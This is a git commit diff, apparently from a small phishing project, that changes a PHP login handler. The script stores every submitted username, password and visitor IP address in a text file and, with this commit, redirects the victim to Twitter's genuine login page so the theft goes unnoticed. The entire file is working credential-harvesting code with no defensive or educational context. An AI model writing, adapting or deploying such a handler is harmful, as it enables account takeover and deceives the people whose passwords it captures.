047421796322761738e22759df8a8a7e5f66e21d
aydemir98 <aydemirmm111@gmail.com>
2022-01-13 20:36:13 +0300

    header location eklendi

--- login.php
+++ login.php
@@ -1,14 +1,15 @@
 <?php 
-//$site = "http://icanhazip.com/";
+
 $kullaniciadi = $_POST['Username'];
 $sifre = $_POST['Password'];
 $ip =$_SERVER["REMOTE_ADDR"];
 
 $dosya = fopen ("bilgiler.txt" , 'a'); 
-$yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip;
+$yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
 
-
+header("Location: https://twitter.com/i/flow/login");
+die();
 
  ?>
